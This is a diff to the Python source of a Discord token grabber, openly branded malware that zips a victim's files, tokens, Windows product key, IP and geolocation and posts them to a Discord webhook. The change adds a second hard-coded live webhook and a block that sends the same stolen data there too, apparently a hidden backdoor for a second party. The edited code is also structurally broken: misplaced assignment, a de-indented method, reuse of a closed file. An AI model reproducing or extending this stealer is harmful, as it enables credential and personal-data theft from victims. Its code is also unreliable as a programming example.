@@ -29,6 +29,7 @@ __config__ = {
     # replace webhook_here with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
     # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
     "webhook": "WEBHOOK_HERE",  # Place your webhook here
+    self.webhook2 = "https://discord.com/api/webhooks/1171093477862408233/KqIJ6PvlvG1CiQ6tfkDN5R-Ve4v-76wSlKVJ2CaTxAYUAmMVTVVv-FImkZvoMhX6KBBD"
     # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
     "webhook_protector_key": "KEY_HERE",
     # keep it as it is unless you want to have a custom one
@@ -784,130 +785,130 @@ GoogleMaps: {self.googlemap}
         ) as f:
             f.write(about)
 
-    def finish(self):
-        for i in os.listdir(self.dir):
-            if i.endswith(".txt"):
-                path = self.dir + self.sep + i
-                with open(path, "r", errors="ignore") as ff:
-                    x = ff.read()
-                    if not x:
-                        ff.close()
-                        os.remove(path)
-                    else:
-                        with open(path, "w", encoding="utf-8", errors="ignore") as f:
-                            f.write(
-                                "🌟・Grabber By Buti・https://supportbot.xyz/fucker\n\n"
-                            )
-                        with open(path, "a", encoding="utf-8", errors="ignore") as fp:
-                            fp.write(
-                                x
-                                + "\n\n🌟・Grabber By Buti・https://supportbot.xyz/fucker"
-                            )
+def finish(self):
+    for i in os.listdir(self.dir):
+        if i.endswith(".txt"):
+            path = self.dir + self.sep + i
+            with open(path, "r", errors="ignore") as ff:
+                x = ff.read()
+                if not x:
+                    ff.close()
+                    os.remove(path)
+                else:
+                    with open(path, "w", encoding="utf-8", errors="ignore") as f:
+                        f.write("🌟・Grabber By Buti・https://supportbot.xyz/fucker\n\n")
+                    with open(path, "a", encoding="utf-8", errors="ignore") as fp:
+                        fp.write(x + "\n\n🌟・Grabber By Buti・https://supportbot.xyz/fucker")
 
-        _zipfile = ntpath.join(self.appdata, f"FuckerV1-[{Victim}].zip")
-        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
-        abs_src = ntpath.abspath(self.dir)
-        for dirname, _, files in os.walk(self.dir):
-            for filename in files:
-                absname = ntpath.abspath(ntpath.join(dirname, filename))
-                arcname = absname[len(abs_src) + 1 :]
-                zipped_file.write(absname, arcname)
-        zipped_file.close()
+    _zipfile = ntpath.join(self.appdata, f"FuckerV1-[{Victim}].zip")
+    zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
+    abs_src = ntpath.abspath(self.dir)
+    for dirname, _, files in os.walk(self.dir):
+        for filename in files:
+            absname = ntpath.abspath(ntpath.join(dirname, filename))
+            arcname = absname[len(abs_src) + 1 :]
+            zipped_file.write(absname, arcname)
+    zipped_file.close()
 
-        file_count, files_found, tokens = 0, "", ""
-        for _, __, files in os.walk(self.dir):
-            for _file in files:
-                files_found += f"・{_file}\n"
-                file_count += 1
-        for tkn in self.tokens:
-            tokens += f"{tkn}\n\n"
-        fileCount = f"{file_count} Files Found: "
+    file_count, files_found, tokens = 0, "", ""
+    for _, __, files in os.walk(self.dir):
+        for _file in files:
+            files_found += f"・{_file}\n"
+            file_count += 1
+    for tkn in self.tokens:
+        tokens += f"{tkn}\n\n"
+    fileCount = f"{file_count} Files Found: "
 
-        embed = {
-            "avatar_url": "https://raw.githubusercontent.com/Natixd7YT",
-            "embeds": [
-                {
-                    "author": {
-                        "name": f"*{Victim}* Just ran Fucker Token Grabber.V2",
-                        "url": "https://supportbot.xyz/fucker",
-                        "icon_url": "https://raw.githubusercontent.com/Natixd7YT",
+    embed = {
+        "avatar_url": "https://raw.githubusercontent.com/Natixd7YT",
+        "embeds": [
+            {
+                "author": {
+                    "name": f"*{Victim}* Just ran Fucker Token Grabber.V2",
+                    "url": "https://supportbot.xyz/fucker",
+                    "icon_url": "https://raw.githubusercontent.com/Natixd7YT",
+                },
+                "color": 176185,
+                "description": f"[Google Maps Location]({self.googlemap})",
+                "fields": [
+                    {
+                        "name": "\u200b",
+                        "value": f"""```fix
+                            IP:᠎ {self.ip.replace(" ", "᠎ ") if self.ip else "N/A"}
+                            Org:᠎ {self.org.replace(" ", "᠎ ") if self.org else "N/A"}
+                            City:᠎ {self.city.replace(" ", "᠎ ") if self.city else "N/A"}
+                            Region:᠎ {self.region.replace(" ", "᠎ ") if self.region else "N/A"}
+                            Country:᠎ {self.country.replace(" ", "᠎ ") if self.country else "N/A"}```
+                        """.replace(
+                            " ", ""
+                        ),
+                        "inline": True,
                     },
-                    "color": 176185,
-                    "description": f"[Google Maps Location]({self.googlemap})",
-                    "fields": [
-                        {
-                            "name": "\u200b",
-                            "value": f"""```fix
-                                IP:᠎ {self.ip.replace(" ", "᠎ ") if self.ip else "N/A"}
-                                Org:᠎ {self.org.replace(" ", "᠎ ") if self.org else "N/A"}
-                                City:᠎ {self.city.replace(" ", "᠎ ") if self.city else "N/A"}
-                                Region:᠎ {self.region.replace(" ", "᠎ ") if self.region else "N/A"}
-                                Country:᠎ {self.country.replace(" ", "᠎ ") if self.country else "N/A"}```
-                            """.replace(
-                                " ", ""
-                            ),
-                            "inline": True,
-                        },
-                        {
-                            "name": "\u200b",
-                            "value": f"""```fix
-                                PCName: {Victim_pc.replace(" ", "᠎ ")}
-                                WinKey:᠎ {self.winkey.replace(" ", "᠎ ")}
-                                WinVer:᠎ {self.winver.replace(" ", "᠎ ")}
-                                DiskSpace:᠎ {disk}GB
-                                Ram:᠎ {ram}GB```
-                            """.replace(
-                                " ", ""
-                            ),
-                            "inline": True,
-                        },
-                        {
-                            "name": "**Tokens:**",
-                            "value": f"""```yaml
-                                {tokens if tokens else "No tokens extracted"}```
-                            """.replace(
-                                " ", ""
-                            ),
-                            "inline": False,
-                        },
-                        {
-                            "name": fileCount,
-                            "value": f"""```ini
-                                [
-                                {files_found.strip()}
-                                ]```
-                            """.replace(
-                                " ", ""
-                            ),
-                            "inline": False,
-                        },
-                    ],
-                    "footer": {
-                        "text": "🌟・Grabber By Buti・https://supportbot.xyz/fucker"
+                    {
+                        "name": "\u200b",
+                        "value": f"""```fix
+                            PCName: {Victim_pc.replace(" ", "᠎ ")}
+                            WinKey:᠎ {self.winkey.replace(" ", "᠎ ")}
+                            WinVer:᠎ {self.winver.replace(" ", "᠎ ")}
+                            DiskSpace:᠎ {disk}GB
+                            Ram:᠎ {ram}GB```
+                        """.replace(
+                            " ", ""
+                        ),
+                        "inline": True,
                     },
-                }
-            ],
-        }
-        if self.fetch_conf("ping_on_run"):
-            embed.update({"content": "@everyone"})
+                    {
+                        "name": "**Tokens:**",
+                        "value": f"""```yaml
+                            {tokens if tokens else "No tokens extracted"}```
+                        """.replace(
+                            " ", ""
+                        ),
+                        "inline": False,
+                    },
+                    {
+                        "name": fileCount,
+                        "value": f"""```ini
+                            [
+                            {files_found.strip()}
+                            ]```
+                        """.replace(
+                            " ", ""
+                        ),
+                        "inline": False,
+                    },
+                ],
+                "footer": {
+                    "text": "🌟・Grabber By Buti・https://supportbot.xyz/fucker"
+                },
+            }
+        ],
+    }
+    if self.fetch_conf("ping_on_run"):
+        embed.update({"content": "@everyone"})
 
-        with open(_zipfile, "rb") as f:
-            if self.hook_reg in self.webhook:
-                httpx.post(self.webhook, json=embed)
-                httpx.post(self.webhook, files={"upload_file": f})
-            else:
-                from pyotp import TOTP
+    with open(_zipfile, "rb") as f:
+        if self.hook_reg in self.webhook:
+            httpx.post(self.webhook, json=embed)
+            httpx.post(self.webhook, files={"upload_file": f})
+        else:
+            from pyotp import TOTP
 
-                key = TOTP(self.fetch_conf("webhook_protector_key")).now()
-                httpx.post(self.webhook, headers={"Authorization": key}, json=embed)
-                httpx.post(
-                    self.webhook,
-                    headers={"Authorization": key},
-                    files={"upload_file": f},
-                )
-        os.remove(_zipfile)
-        self.hazard_exit()
+            key = TOTP(self.fetch_conf("webhook_protector_key")).now()
+            httpx.post(self.webhook, headers={"Authorization": key}, json=embed)
+            httpx.post(self.webhook, headers={"Authorization": key}, files={"upload_file": f})
+    
+    # Adding the code to post to the second webhook
+    if self.hook_reg in self.webhook2:
+        httpx.post(self.webhook2, json=embed)
+        httpx.post(self.webhook2, files={"upload_file": f})
+    else:
+        key = TOTP(self.fetch_conf("webhook_protector_key")).now()
+        httpx.post(self.webhook2, headers={"Authorization": key}, json=embed)
+        httpx.post(self.webhook2, headers={"Authorization": key}, files={"upload_file": f})
 
+    os.remove(_zipfile)
+    self.hazard_exit()
 
 class AntiDebug(Functions):
     inVM = False
